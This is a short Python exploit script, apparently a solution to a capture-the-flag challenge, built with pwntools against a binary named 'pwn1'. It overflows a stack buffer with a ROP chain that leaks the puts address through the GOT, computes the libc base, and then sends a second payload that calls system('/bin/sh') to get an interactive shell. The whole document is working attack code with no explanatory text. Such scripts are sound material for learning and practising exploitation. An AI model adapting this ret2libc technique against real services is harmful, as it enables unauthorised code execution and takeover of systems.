from pwn import *

context.log_level = "debug"
io = process("./pwn1")
#io = remote("node5.anna.nssctf.cn", 27124)
elf = ELF("./pwn1")

libc = ELF("/usr/lib/libc.so.6")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pop_rdi = 0x400C83
ret_addr = 0x4006B9

io.sendline(b"1")
io.recvuntil(b"encrypted")
payload = (
    b"\x00" * (0x50 + 8)
    + p64(pop_rdi)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(0x400B28)
)
io.sendline(payload)
io.recvuntil(b"Ciphertext\n\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
base_libc = puts_addr - libc.sym["puts"]
system_addr = base_libc + libc.sym["system"]
binsh_addr = base_libc + next(libc.search(b"/bin/sh\x00"))


print("puts address = ", hex(puts_addr))
print("libc base address = ", hex(base_libc))
print("system address = ", hex(system_addr))
print("/bin/sh address = ", hex(binsh_addr))

io.sendline(b"1")
payload = (
    b"\x00" * (0x50 + 8)
    + p64(ret_addr)
    + p64(pop_rdi)
    + p64(binsh_addr)
    + p64(system_addr)
    + p64(0)
)
io.sendline(payload)
io.interactive()
